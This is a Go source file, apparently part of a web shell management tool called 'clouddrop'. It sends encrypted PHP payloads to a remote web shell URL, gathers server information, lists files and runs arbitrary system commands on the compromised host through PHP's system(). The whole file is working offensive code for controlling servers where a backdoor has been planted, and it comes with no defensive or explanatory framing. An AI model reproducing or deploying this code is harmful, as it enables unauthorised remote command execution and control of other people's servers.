package service

import (
	"clouddrop/pkg/util"
	"os"
	"strings"
)

var PhpSessions map[int]string

func (s *PHPShell) GetShellType() string {
	return "php"
}

func (s *PHPShell) FreshSession(id int, url string, password string) (string, error) {
	if PhpSessions == nil {
		// first init php shell
		PhpSessions = make(map[int]string)
	}
	// Get the target code and encrypt
	code, err := os.ReadFile("./pkg/api/php/Check.php")
	if err != nil {
		return "", err
	}
	code = append(code, []byte("\nmain();")...) // add main() to call

	enCode := util.Encrypt(string(code), password)

	session := PhpSessions[id] // if key not exist, it returns "" , bcz type is string
	if session == "" {
		PhpSessions[id], err = util.PostRequestWithoutSession(url, password, enCode)
		return "FreshSession success", err
	}

	enResult, err := util.PostRequest(url, password, enCode, session)
	if err != nil {
		return "", err
	}
	// 解密code
	res := util.Decrypt(enResult, password)
	return strings.TrimSpace(res), nil
}

// BaseInfo
func (s *PHPShell) BaseInfo(id int, url string, password string) (string, error) {
	// code := `echo getcwd();`
	code, err := os.ReadFile("./pkg/api/php/BaseInfo.php")
	if err != nil {
		return "", err
	}
	code = append(code, []byte("\nmain();")...) // add main() to call

	// 加密code发送请求
	enCode := util.Encrypt(string(code), password)
	enResult, err := util.PostRequest(url, password, enCode, PhpSessions[id])
	if err != nil {
		return "", err
	}

	// 解密code
	res := util.Decrypt(enResult, password)
	return strings.TrimSpace(res), nil
}

// ListFiles lists all files in the current directory
func (s *PHPShell) ListFiles(id int, url string, password string) ([]string, error) {
	code := `
	$files = scandir(getcwd());
	foreach ($files as $file) {
		if ($file != "." && $file != "..") {
			echo $file . "\n";
		}
	}
	`
	result, err := util.PostRequest(url, password, code, PhpSessions[id])
	if err != nil {
		return nil, err
	}

	files := strings.Split(strings.TrimSpace(result), "\n")
	return files, nil
}

// ExecCommand executes a command on the PHP shell and returns the output
func (s *PHPShell) ExecCommand(id int, url string, password string, command string) (string, error) {
	// Todo 分别处理win和类Unix系统的命令
	code := `system(` + "`" + command + "`" + `);`
	result, err := util.PostRequest(url, password, code, PhpSessions[id])
	if err != nil {
		return "", err
	}

	return strings.TrimSpace(result), nil
}
